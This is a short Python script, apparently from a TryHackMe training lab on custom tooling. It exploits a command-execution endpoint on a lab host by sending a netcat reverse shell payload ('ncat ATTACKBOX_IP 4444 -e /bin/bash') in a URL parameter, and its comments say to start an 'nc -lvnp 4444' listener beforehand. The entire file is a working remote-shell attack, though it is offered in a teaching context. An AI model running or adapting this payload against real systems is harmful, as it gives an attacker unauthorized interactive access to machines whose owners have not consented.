# This script sends a reverse shell payload to gain persistent access to a target system.
# It was inspired by the "Custom tooling using python" lesson on tryhackme.com.
# You need to start a listener with 'nc -lvnp 4444' on your VM or AttackBox first.

import requests  # Used to send HTTP requests to the target.

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="  # The URL to send the command.

# Reverse shell payload (Change ATTACKBOX_IP)
payload = "ncat ATTACKBOX_IP 4444 -e /bin/bash"  # Payload to connect back to the AttackBox IP.

print("[+] Sending reverse shell payload...")  # Show that the payload is being sent.

requests.get(TARGET_URL + payload)  # Send the payload to the target URL.
